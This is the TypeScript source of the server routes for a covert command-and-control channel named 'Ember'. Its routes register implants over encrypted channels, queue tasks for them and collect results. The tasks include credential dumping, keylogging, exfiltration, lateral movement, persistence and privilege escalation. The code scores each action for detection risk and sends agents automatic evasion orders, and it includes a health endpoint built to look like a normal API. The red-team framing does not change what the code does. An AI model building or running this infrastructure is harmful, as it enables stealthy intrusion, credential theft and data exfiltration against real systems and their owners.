/**
 * Ember Beacon HTTP Routes
 * 
 * Real Express routes for Ember agent communication:
 * - POST /api/ember/register  — Agent registration + ECDH key exchange
 * - POST /api/ember/beacon    — Encrypted beacon check-in (receive tasks, deliver results)
 * - POST /api/ember/result    — Encrypted task result submission
 * - POST /api/ember/rotate    — Key rotation request
 * - GET  /api/ember/health    — Lightweight health check (mimics normal API)
 * 
 * All payloads after registration are AES-256-GCM encrypted using
 * per-agent session keys established via ECDH key exchange.
 * 
 * OPSEC integration: every task execution is scored through the
 * OPSEC Risk Engine, burn indicators are checked on each beacon,
 * and automatic evasive actions are triggered when burn is detected.
 */

import type { Express, Request, Response } from "express";
import crypto from "crypto";
import { getDb } from "../db";
import {
  emberAgents,
  emberTasks,
  emberBeacons,
} from "../../drizzle/schema";
import { eq, and, inArray } from "drizzle-orm";
import {
  performKeyExchange,
  performKeyRotation,
  encryptJsonForAgent,
  decryptJsonFromAgent,
  needsKeyRotation,
  getAgentCryptoState,
  destroyAgentSession,
  isValidRegistrationToken,
  type EmberEncryptedMessage,
  type EmberKeyExchangeResponse,
  type EmberKeyRotationResponse,
  EmberCryptoError,
} from "./ember-crypto";
import {
  EMBER_PROFILE_DESCRIPTIONS,
  EMBER_CAPABILITY_CATALOG,
  type EmberTaskType,
} from "./ember-agent-core";
import {
  scoreActionRisk,
  checkBurnIndicators,
  deterministicScoreActionRisk,
} from "./opsec-risk-engine";
import { createAlert } from "./opsec-monitor";
import {
  emitEmberAgentRegistered,
  emitEmberBeacon,
  emitEmberTaskComplete,
  emitEmberBurnResponse,
  emitEmberKeyRotation,
  emitEmberOpsecScored,
  emitOpsecActionScored,
  emitOpsecBurnDetected,
} from "./ws-event-hub";

// ── OPSEC Task-to-Action Mapping ───────────────────────────────────────────

/** Map Ember task types to OPSEC risk engine action types */
const TASK_OPSEC_MAP: Record<string, string> = {
  shell_exec: "command_execution",
  file_ops: "file_access",
  cred_dump: "credential_harvest",
  lateral_move: "lateral_movement",
  persist: "persistence",
  screenshot: "data_collection",
  keylog: "data_collection",
  exfil: "data_exfil",
  recon: "port_scan",
  privesc: "privesc_attempt",
  inject: "command_execution",
  self_destruct: "c2_callback", // Low risk — cleanup
};

/** Burn response actions based on severity */
const BURN_RESPONSE_MAP: Record<string, "jitter_increase" | "channel_hop" | "sleep_extend" | "go_dormant" | "self_destruct"> = {
  low: "jitter_increase",
  medium: "channel_hop",
  high: "sleep_extend",
  critical: "go_dormant",
};

// ── Route Registration ─────────────────────────────────────────────────────

export function registerEmberBeaconRoutes(app: Express): void {
  console.log("[Ember] Registering beacon HTTP routes...");

  // ── POST /api/ember/register ─────────────────────────────────────────
  // Agent registration with ECDH key exchange
  app.post("/api/ember/register", async (req: Request, res: Response) => {
    try {
      const {
        agentPublicKey,
        registrationToken,
        hostname,
        platform,
        arch,
        pid,
        username,
        profile,
        engagementId,
        systemInfo,
      } = req.body;

      // Validate required fields
      if (!agentPublicKey || !registrationToken) {
        return res.status(400).json({ error: "Missing required fields" });
      }

      // Validate registration token format
      if (!isValidRegistrationToken(registrationToken)) {
        return res.status(403).json({ error: "Invalid token" });
      }

      // Generate a unique agent ID
      const agentId = `ember-${crypto.randomBytes(6).toString("hex")}`;

      // Perform ECDH key exchange
      const keyExchange: EmberKeyExchangeResponse = performKeyExchange(
        agentId,
        agentPublicKey,
        3600_000, // 1 hour key rotation
      );

      // Store agent in database
      const db = await getDb();
      const now = Date.now();
      // Map incoming platform string to schema enum
      const PLATFORM_MAP: Record<string, string> = {
        linux: "linux_x64", "linux_x64": "linux_x64", "linux_arm64": "linux_arm64",
        windows: "windows_x64", "windows_x64": "windows_x64", "windows_x86": "windows_x86",
        macos: "macos_x64", darwin: "macos_x64", "macos_x64": "macos_x64", "macos_arm64": "macos_arm64",
      };
      const PROFILE_MAP: Record<string, string> = {
        shadow: "ghost", ghost: "ghost", scout: "scout", striker: "striker",
        sentinel: "sentinel", hydra: "hydra", recon: "scout", stealth: "ghost",
      };
      const resolvedPlatform = PLATFORM_MAP[(platform || "linux").toLowerCase()] || "linux_x64";
      const resolvedProfile = PROFILE_MAP[(profile || "ghost").toLowerCase()] || "ghost";
      await db.insert(emberAgents).values({
        agentId,
        name: `ember-${hostname || "unknown"}`,
        hostname: hostname || "unknown",
        platform: resolvedPlatform as any,
        architecture: arch || "x64",
        pid: pid || 0,
        username: username || "unknown",
        profile: resolvedProfile as any,
        state: "active",
        primaryChannel: "https",
        beaconInterval: 30,
        jitterPercent: 25,
        lastBeaconAt: now,
        missedBeacons: 0,
        registrationToken,
        engagementId: engagementId || null,
        configJson: JSON.stringify({ profile: resolvedProfile, keyId: keyExchange.keyId }),
        systemInfoJson: systemInfo ? JSON.stringify(systemInfo) : null,
        evasionScore: 50,
        trafficProfile: "chrome_browsing",
        createdAt: now,
        updatedAt: now,
      });

      // Record initial beacon
      await db.insert(emberBeacons).values({
        agentId,
        sequence: 0,
        state: "active",
        channel: "https",
        systemInfoJson: systemInfo ? JSON.stringify(systemInfo) : null,
        receivedAt: now,
      });

      // Emit real-time event
      emitEmberAgentRegistered({
        agentId,
        hostname: hostname || "unknown",
        platform: platform || "unknown",
        profile: profile || "shadow",
        engagementId: engagementId || undefined,
      });

      // Create OPSEC alert for new agent registration
      createAlert({
        type: "suspicious_activity",
        severity: "info",
        title: `Ember Agent Registered: ${agentId}`,
        description: `New Ember agent registered from ${hostname || "unknown"} (${platform || "unknown"}). Profile: ${profile || "shadow"}.`,
        source: "ember-beacon-handler",
        recommendation: "Monitor agent activity and ensure it operates within engagement scope.",
      });

      // Score the registration action
      const opsecScore = deterministicScoreActionRisk("c2_callback", `Ember agent registration from ${hostname}`, 0);
      emitEmberOpsecScored({
        agentId,
        taskType: "registration",
        riskScore: opsecScore.riskScore,
        riskLevel: opsecScore.riskLevel,
        detectionProbability: opsecScore.detectionProbability,
        burnRisk: opsecScore.burnRisk,
        engagementId: engagementId || undefined,
      });

      // Return key exchange response (this is the only unencrypted response)
      return res.json({
        agentId,
        ...keyExchange,
        capabilities: EMBER_PROFILE_DESCRIPTIONS[profile as keyof typeof EMBER_PROFILE_DESCRIPTIONS]
          ? Object.keys(EMBER_CAPABILITY_CATALOG).slice(0, 5)
          : [],
      });
    } catch (err: any) {
      console.error("[Ember Register] Error:", err.message, err.stack);
      // Return generic error to avoid leaking info
      return res.status(500).json({ error: "Registration failed" });
    }
  });

  // ── POST /api/ember/beacon ───────────────────────────────────────────
  // Encrypted beacon check-in: agent sends status, receives pending tasks
  app.post("/api/ember/beacon", async (req: Request, res: Response) => {
    try {
      const { agentId, message } = req.body as {
        agentId: string;
        message: EmberEncryptedMessage;
      };

      if (!agentId || !message) {
        return res.status(400).json({ error: "Invalid beacon" });
      }

      // Decrypt the beacon payload
      let beaconData: {
        state: string;
        channel: string;
        pid: number;
        hostname: string;
        evasionScore?: number;
        taskResults?: Array<{
          taskId: string;
          status: string;
          output: string;
          artifacts?: any[];
        }>;
      };

      try {
        beaconData = decryptJsonFromAgent(agentId, message);
      } catch (err) {
        if (err instanceof EmberCryptoError) {
          if (err.code === "REPLAY_DETECTED") {
            return res.status(409).json({ error: "Replay detected" });
          }
          if (err.code === "NO_SESSION") {
            return res.status(401).json({ error: "No session — re-register" });
          }
          if (err.code === "KEY_EXPIRED") {
            return res.status(401).json({ error: "Key expired — rotate" });
          }
        }
        return res.status(403).json({ error: "Decryption failed" });
      }

      const db = await getDb();
      const now = Date.now();

      // Update agent state in database
      await db.update(emberAgents)
        .set({
          state: beaconData.state || "active",
          lastBeaconAt: now,
          missedBeacons: 0,
          pid: beaconData.pid || undefined,
          evasionScore: beaconData.evasionScore || undefined,
          updatedAt: now,
        })
        .where(eq(emberAgents.agentId, agentId));

      // Process task results if any
      let resultsReceived = 0;
      if (beaconData.taskResults && beaconData.taskResults.length > 0) {
        for (const result of beaconData.taskResults) {
          await db.update(emberTasks)
            .set({
              status: result.status === "success" ? "completed" : "failed",
              resultJson: JSON.stringify({ output: result.output, artifacts: result.artifacts }),
              completedAt: now,
              updatedAt: now,
            })
            .where(eq(emberTasks.taskId, result.taskId));

          resultsReceived++;

          // OPSEC score each completed task
          const taskRows = await db.select().from(emberTasks).where(eq(emberTasks.taskId, result.taskId)).limit(1);
          if (taskRows.length > 0) {
            const task = taskRows[0];
            const opsecActionType = TASK_OPSEC_MAP[task.taskType] || "command_execution";

            try {
              const opsecScore = await scoreActionRisk(
                opsecActionType,
                `Ember agent ${agentId} executed ${task.taskType}: ${task.commandJson || ""}`,
                undefined,
                undefined,
                undefined,
              );

              emitEmberOpsecScored({
                agentId,
                taskType: task.taskType,
                riskScore: opsecScore.riskScore,
                riskLevel: opsecScore.riskLevel,
                detectionProbability: opsecScore.detectionProbability,
                burnRisk: opsecScore.burnRisk,
                engagementId: task.engagementId || undefined,
              });

              emitOpsecActionScored({
                action: `ember:${task.taskType}`,
                riskScore: opsecScore.riskScore,
                detectionTechnologies: opsecScore.detectedBy.map(d => d.technology),
                mitigations: opsecScore.mitigations,
                engagementId: task.engagementId || undefined,
              });

              // Emit task complete event
              emitEmberTaskComplete({
                agentId,
                taskId: result.taskId,
                taskType: task.taskType,
                status: result.status,
                engagementId: task.engagementId || undefined,
                opsecRiskScore: opsecScore.riskScore,
              });

              // Check for burn risk
              if (opsecScore.burnRisk) {
                createAlert({
                  type: "opsec_violation",
                  severity: "high",
                  title: `Ember OPSEC Burn Risk: ${agentId}`,
                  description: `Task ${task.taskType} on agent ${agentId} has high burn risk (score: ${opsecScore.riskScore}). Detection probability: ${opsecScore.detectionProbability}%.`,
                  source: "ember-opsec",
                  recommendation: opsecScore.mitigations.join("; ") || "Consider reducing agent activity or rotating infrastructure.",
                });

                emitOpsecBurnDetected({
                  indicator: `ember_task_${task.taskType}`,
                  severity: opsecScore.riskScore >= 80 ? "critical" : "warning",
                  description: `Ember agent ${agentId} task ${task.taskType} scored ${opsecScore.riskScore}/100 risk`,
                  engagementId: task.engagementId || undefined,
                });
              }
            } catch {
              // OPSEC scoring failed — continue without blocking
            }
          }
        }
      }

      // Check burn indicators from recent beacon events
      const recentBeacons = await db.select().from(emberBeacons)
        .where(eq(emberBeacons.agentId, agentId))
        .limit(20);

      const burnEvents = recentBeacons.map(b => ({
        type: b.beaconType === "registration" ? "c2_callback" : "c2_callback",
        success: true,
        timestamp: Number(b.timestamp),
      }));

      const burnIndicators = checkBurnIndicators(burnEvents);
      let burnResponse: { action: string; instructions: string } | null = null;

      if (burnIndicators.length > 0) {
        const worstSeverity = burnIndicators.reduce((worst, bi) => {
          const severityOrder = { critical: 4, high: 3, medium: 2, low: 1 };
          return severityOrder[bi.severity] > severityOrder[worst] ? bi.severity : worst;
        }, "low" as "critical" | "high" | "medium" | "low");

        const responseAction = BURN_RESPONSE_MAP[worstSeverity] || "jitter_increase";

        burnResponse = {
          action: responseAction,
          instructions: burnIndicators[0].recommendedAction,
        };

        // Emit burn response event
        emitEmberBurnResponse({
          agentId,
          burnIndicator: burnIndicators[0].id,
          severity: worstSeverity === "low" ? "medium" : worstSeverity as "medium" | "high" | "critical",
          action: responseAction,
          engagementId: undefined,
        });

        // Create OPSEC alert
        createAlert({
          type: "opsec_violation",
          severity: worstSeverity === "low" ? "medium" : worstSeverity,
          title: `Ember Burn Detected: ${burnIndicators[0].name}`,
          description: `Agent ${agentId}: ${burnIndicators[0].description}. Automatic response: ${responseAction}.`,
          source: "ember-burn-detector",
          recommendation: burnIndicators[0].recommendedAction,
        });
      }

      // Fetch pending tasks for this agent
      const pendingTasks = await db.select().from(emberTasks)
        .where(and(
          eq(emberTasks.agentId, agentId),
          eq(emberTasks.status, "pending"),
        ))
        .limit(10);

      // Mark fetched tasks as dispatched
      if (pendingTasks.length > 0) {
        const taskIds = pendingTasks.map(t => t.taskId);
        await db.update(emberTasks)
          .set({ status: "dispatched", dispatchedAt: now, updatedAt: now })
          .where(inArray(emberTasks.taskId, taskIds));
      }

      // Record this beacon
      await db.insert(emberBeacons).values({
        agentId,
        beaconType: "checkin",
        channel: beaconData.channel || "https",
        sourceIp: req.ip || req.socket.remoteAddress || "unknown",
        encrypted: 1,
        payloadSize: JSON.stringify(message).length,
        tasksDelivered: pendingTasks.length,
        resultsReceived,
        processingTimeMs: Date.now() - now,
        timestamp: now,
      });

      // Emit beacon event
      emitEmberBeacon({
        agentId,
        hostname: beaconData.hostname || "unknown",
        state: beaconData.state || "active",
        channel: beaconData.channel || "https",
        tasksDelivered: pendingTasks.length,
        resultsReceived,
      });

      // Check if key rotation is needed
      const rotationNeeded = needsKeyRotation(agentId);

      // Build encrypted response
      const responsePayload = {
        tasks: pendingTasks.map(t => ({
          taskId: t.taskId,
          type: t.taskType,
          command: t.commandJson ? JSON.parse(t.commandJson) : null,
          priority: t.priority,
          timeoutMs: t.timeoutMs,
        })),
        rotationNeeded,
        burnResponse,
        serverTimestamp: Date.now(),
      };

      const encryptedResponse = encryptJsonForAgent(agentId, responsePayload);
      return res.json({ message: encryptedResponse });

    } catch (err: any) {
      console.error("[Ember Beacon] Error:", err.message);
      return res.status(500).json({ error: "Beacon processing failed" });
    }
  });

  // ── POST /api/ember/result ───────────────────────────────────────────
  // Encrypted task result submission (for large results sent separately)
  app.post("/api/ember/result", async (req: Request, res: Response) => {
    try {
      const { agentId, message } = req.body as {
        agentId: string;
        message: EmberEncryptedMessage;
      };

      if (!agentId || !message) {
        return res.status(400).json({ error: "Invalid result" });
      }

      let resultData: {
        taskId: string;
        status: string;
        output: string;
        artifacts?: Array<{ type: string; path: string; data?: string }>;
        opsecNotes?: string;
      };

      try {
        resultData = decryptJsonFromAgent(agentId, message);
      } catch (err) {
        if (err instanceof EmberCryptoError) {
          if (err.code === "NO_SESSION") {
            return res.status(401).json({ error: "No session" });
          }
        }
        return res.status(403).json({ error: "Decryption failed" });
      }

      const db = await getDb();
      const now = Date.now();

      // Update the task
      await db.update(emberTasks)
        .set({
          status: resultData.status === "success" ? "completed" : "failed",
          resultJson: JSON.stringify({
            output: resultData.output,
            artifacts: resultData.artifacts,
            opsecNotes: resultData.opsecNotes,
          }),
          completedAt: now,
          updatedAt: now,
        })
        .where(eq(emberTasks.taskId, resultData.taskId));

      // OPSEC score the completed task
      const taskRows = await db.select().from(emberTasks).where(eq(emberTasks.taskId, resultData.taskId)).limit(1);
      if (taskRows.length > 0) {
        const task = taskRows[0];
        const opsecActionType = TASK_OPSEC_MAP[task.taskType] || "command_execution";
        const opsecScore = deterministicScoreActionRisk(opsecActionType, `Ember ${task.taskType} result`, 0);

        emitEmberTaskComplete({
          agentId,
          taskId: resultData.taskId,
          taskType: task.taskType,
          status: resultData.status,
          engagementId: task.engagementId || undefined,
          opsecRiskScore: opsecScore.riskScore,
        });
      }

      // Encrypt acknowledgment
      const ack = encryptJsonForAgent(agentId, { received: true, taskId: resultData.taskId });
      return res.json({ message: ack });

    } catch (err: any) {
      console.error("[Ember Result] Error:", err.message);
      return res.status(500).json({ error: "Result processing failed" });
    }
  });

  // ── POST /api/ember/rotate ───────────────────────────────────────────
  // Key rotation request
  app.post("/api/ember/rotate", async (req: Request, res: Response) => {
    try {
      const { agentId, message } = req.body as {
        agentId: string;
        message: EmberEncryptedMessage;
      };

      if (!agentId || !message) {
        return res.status(400).json({ error: "Invalid rotation request" });
      }

      // Decrypt the rotation request using current key
      let rotationData: {
        newAgentPublicKey: string;
        currentKeyId: string;
        rotationSequence: number;
      };

      try {
        rotationData = decryptJsonFromAgent(agentId, message);
      } catch (err) {
        if (err instanceof EmberCryptoError) {
          if (err.code === "NO_SESSION") {
            return res.status(401).json({ error: "No session" });
          }
        }
        return res.status(403).json({ error: "Decryption failed" });
      }

      // Get old key ID for event emission
      const oldState = getAgentCryptoState(agentId);
      const oldKeyId = oldState?.currentKeyId || "unknown";

      // Perform the key rotation
      const rotationResponse: EmberKeyRotationResponse = performKeyRotation(
        agentId,
        rotationData.newAgentPublicKey,
      );

      // Emit key rotation event
      emitEmberKeyRotation({
        agentId,
        oldKeyId,
        newKeyId: rotationResponse.newKeyId,
        rotationCount: oldState?.rotationCount ? oldState.rotationCount + 1 : 1,
      });

      // The rotation response is encrypted with the NEW key
      const encryptedResponse = encryptJsonForAgent(agentId, rotationResponse);
      return res.json({ message: encryptedResponse });

    } catch (err: any) {
      console.error("[Ember Rotate] Error:", err.message);
      return res.status(500).json({ error: "Rotation failed" });
    }
  });

  // ── GET /api/ember/health ────────────────────────────────────────────
  // Lightweight health check that mimics a normal API endpoint
  // Agents can use this to verify connectivity without a full beacon
  app.get("/api/ember/health", (_req: Request, res: Response) => {
    // Return a response that looks like a normal API health check
    res.json({
      status: "ok",
      version: "1.0.0",
      timestamp: Date.now(),
    });
  });

  // ── POST /api/ember/terminate ────────────────────────────────────────
  // Agent self-termination notification
  app.post("/api/ember/terminate", async (req: Request, res: Response) => {
    try {
      const { agentId, message } = req.body as {
        agentId: string;
        message?: EmberEncryptedMessage;
      };

      if (!agentId) {
        return res.status(400).json({ error: "Missing agentId" });
      }

      // Try to decrypt if message is provided (agent may send final status)
      if (message) {
        try {
          const termData = decryptJsonFromAgent(agentId, message);
          console.log(`[Ember] Agent ${agentId} terminating: ${JSON.stringify(termData)}`);
        } catch {
          // Ignore decryption errors on termination
        }
      }

      const db = await getDb();
      const now = Date.now();

      // Mark agent as terminated
      await db.update(emberAgents)
        .set({
          state: "terminated",
          terminatedAt: now,
          updatedAt: now,
        })
        .where(eq(emberAgents.agentId, agentId));

      // Destroy crypto session (zero out keys)
      destroyAgentSession(agentId);

      // Create OPSEC alert
      createAlert({
        type: "suspicious_activity",
        severity: "info",
        title: `Ember Agent Terminated: ${agentId}`,
        description: `Agent ${agentId} has self-terminated and crypto session has been destroyed.`,
        source: "ember-beacon-handler",
        recommendation: "Verify termination was intentional. Check for signs of detection.",
      });

      return res.json({ status: "terminated" });

    } catch (err: any) {
      console.error("[Ember Terminate] Error:", err.message);
      return res.status(500).json({ error: "Termination failed" });
    }
  });

  console.log("[Ember] Beacon routes registered: /api/ember/{register,beacon,result,rotate,health,terminate}");
}
